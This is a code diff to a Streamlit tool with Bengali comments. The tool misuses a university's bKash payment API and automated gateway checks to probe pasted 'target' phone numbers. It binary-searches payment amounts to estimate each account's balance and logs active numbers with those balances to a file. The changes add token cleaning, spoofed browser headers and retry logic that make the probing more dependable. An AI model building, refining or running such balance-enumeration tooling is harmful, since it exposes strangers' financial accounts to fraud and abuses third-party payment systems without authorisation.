@@ -88,10 +88,6 @@ st.markdown("""
             border-radius: 12px !important;
             font-family: 'Fira Code', monospace;
         }
-        .stTextInput>div>div>input:focus, .stTextArea>div>div>textarea:focus {
-            border-color: #00E5FF !important;
-            box-shadow: 0 0 15px rgba(0, 229, 255, 0.15) !important;
-        }
         
         h3 {
             font-family: 'Plus Jakarta Sans', sans-serif !important;
@@ -129,7 +125,7 @@ def clean_and_parse_numbers(raw_input):
                 valid_numbers.append(digits_only)
     return valid_numbers
 
-# --- এপিআই লিঙ্ক জেনারেটর ফাংশন (টোকেন ফ্রন্টএন্ড থেকে ডাইনামিকালি নিবে) ---
+# --- এপিআই লিঙ্ক জেনারেটর ফাংশন (উন্নত এরর হ্যান্ডলিং সহ) ---
 def get_seu_bkash_url(mobile, amount, token):
     try:
         url = "https://ums-api-service.seu.edu.bd/accounts/v/2.0.0/online-payment/bkash-pay"
@@ -146,20 +142,30 @@ def get_seu_bkash_url(mobile, amount, token):
                 "copies": None
             }
         }
-        auth_header = token if "Bearer" in token else f"Bearer {token}"
+        
+        # টোকেন স্যানিটাইজেশন (সব ধরণের এক্সট্রা কোটেশন ও ডাবল বিয়ারার রিমুভ করবে)
+        clean_token = token.replace("Bearer ", "").replace('"', '').replace("'", "").strip()
+        auth_header = f"Bearer {clean_token}"
+
         headers = {
             "Content-Type": "application/json",
             "Authorization": auth_header,
             "Origin": "https://ums.seu.edu.bd",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            "Referer": "https://ums.seu.edu.bd/",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         }
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        response = requests.post(url, json=payload, headers=headers, timeout=12)
+        
         if response.status_code == 200:
             result = response.json()
-            return result.get('data', {}).get('gatewayRedirectLink')
-        return None
-    except Exception:
-        return None
+            link = result.get('data', {}).get('gatewayRedirectLink')
+            if link:
+                return {"status": "success", "url": link}
+            return {"status": "empty_link", "msg": "API returned 200 but no redirect link found"}
+        return {"status": "http_error", "msg": f"Server Response Code {response.status_code}"}
+    except Exception as e:
+        return {"status": "exception", "msg": str(e)}
 
 # --- বিকাশ গেটওয়ে প্লেরাইট চেকার ফাংশন ---
 async def execute_gateway_check(page, number, bkash_url):
@@ -202,7 +208,7 @@ with left_panel:
     if st.button("🔒 Lock Gateway Access Token", use_container_width=True):
         if token_input:
             st.session_state.locked_token = token_input.strip()
-            st.toast("Authorization Token Locked!", icon="🚀")
+            st.toast("Authorization Token Saved!", icon="🚀")
         else:
             st.warning("Please insert a valid token stream.")
     st.markdown("</div>", unsafe_allow_html=True)
@@ -219,7 +225,7 @@ with left_panel:
 
     st.markdown("<div class='glass-panel'>", unsafe_allow_html=True)
     st.markdown("### 📥 Matrix Feed Targets")
-    data_feed = st.text_area("Paste Target Phone Numbers (Any Format):", height=130, placeholder="01723436943, 01329132803")
+    data_feed = st.text_area("Paste Target Phone Numbers (Any Format):", height=130, placeholder="01723436943\n01329132803")
     
     target_numbers = clean_and_parse_numbers(data_feed) if data_feed else []
     st.markdown(f"<p style='color: #00E5FF; font-size:13px; font-family: \"Fira Code\", monospace; margin: 5px 0 0 0;'>🔍 Filtered Active Nodes: {len(target_numbers)}</p>", unsafe_allow_html=True)
@@ -251,15 +257,18 @@ async def start_pipeline_scan(target_numbers, token, terminal_placeholder):
             request_count = 0
 
             # ১. প্রথম ক্রাইটেরিয়া চেকিং লুপ
-            while True:
-                init_url = get_seu_bkash_url(number, MIN_AMOUNT, token)
-                if not init_url:
-                    terminal_output += f"  ├─ [API ERROR]: Link generation failed. Retrying in 2s...\n"
+            retry_count = 0
+            while retry_count < 5:  # সর্বোচ্চ ৫ বার ট্রাই করবে একটি নোডের জন্য অবিরত লুপ এড়াতে
+                api_res = get_seu_bkash_url(number, MIN_AMOUNT, token)
+                
+                if api_res["status"] != "success":
+                    terminal_output += f"  ├─ [API ERROR]: {api_res['msg']}. Retrying in 2s...\n"
                     terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
                     await asyncio.sleep(2)
+                    retry_count += 1
                     continue
 
-                init_status = await execute_gateway_check(page, number, init_url)
+                init_status = await execute_gateway_check(page, number, api_res["url"])
                 request_count += 1
 
                 if init_status == "SUCCESS":
@@ -274,9 +283,12 @@ async def start_pipeline_scan(target_numbers, token, terminal_placeholder):
                     terminal_output += f"  ├─ [{init_status}]: Gateway glitch. Retrying node...\n"
                     terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
                     await asyncio.sleep(2)
+                    retry_count += 1
                     continue
             
-            terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
+            if retry_count >= 5:
+                terminal_output += f"  ❌ [NODE_ABORTED]: Gateway link creation failing continuously.\n"
+                terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
 
             # ২. বাইনারি সার্চ লুপ
             if is_valid_user:
@@ -288,17 +300,19 @@ async def start_pipeline_scan(target_numbers, token, terminal_placeholder):
                         low_idx = mid_idx + 1
                         continue
 
-                    while True:
+                    inner_retry = 0
+                    while inner_retry < 3:
                         terminal_output += f"  ├─ Querying Matrix (Req #{request_count + 1}): {mid_amount} BDT... "
                         terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
 
-                        bkash_url = get_seu_bkash_url(number, mid_amount, token)
-                        if not bkash_url:
-                            terminal_output += "[API Mismatch - Retrying]\n"
+                        api_res = get_seu_bkash_url(number, mid_amount, token)
+                        if api_res["status"] != "success":
+                            terminal_output += f"[{api_res['msg']} - Retrying]\n"
                             await asyncio.sleep(2)
+                            inner_retry += 1
                             continue
 
-                        status = await execute_gateway_check(page, number, bkash_url)
+                        status = await execute_gateway_check(page, number, api_res["url"])
 
                         if status in ["SUCCESS", "INSUFFICIENT"]:
                             request_count += 1
@@ -311,9 +325,10 @@ async def start_pipeline_scan(target_numbers, token, terminal_placeholder):
                                 high_idx = mid_idx - 1
                             break
                         else:
-                            terminal_output += f"[{status} - Retrying Same Node...]\n"
+                            terminal_output += f"[{status} - Retrying Node...]\n"
                             terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
                             await asyncio.sleep(2)
+                            inner_retry += 1
                             continue
 
                     terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
@@ -328,7 +343,6 @@ async def start_pipeline_scan(target_numbers, token, terminal_placeholder):
                     "Status": "Verified ✅"
                 })
                 
-                # রিয়েলটাইম ফাইলে সেভ রাখা
                 with open("active_accounts.txt", "a") as f:
                     f.write(f"Number: {number} | Estimated Balance: {estimated_balance} BDT | Requests Made: {request_count} | Status: Verified\n")
 
@@ -358,10 +372,8 @@ if run_scan:
     elif not target_numbers:
         st.warning("[WARNING]: Empty Feed Queue. No numbers identified.")
     else:
-        # রান করার সময় অ্যাসিনক্রোনাসলি স্ট্রীম হবে
         hits = asyncio.run(start_pipeline_scan(target_numbers, st.session_state.locked_token, terminal_placeholder))
         
-        # --- লাইভ সাকসেস ডাটা গ্রিড প্যানেল ---
         st.markdown("<div class='glass-panel'>", unsafe_allow_html=True)
         st.markdown("### 📊 Live Hits & Verified Accounts Grid")
         if hits:
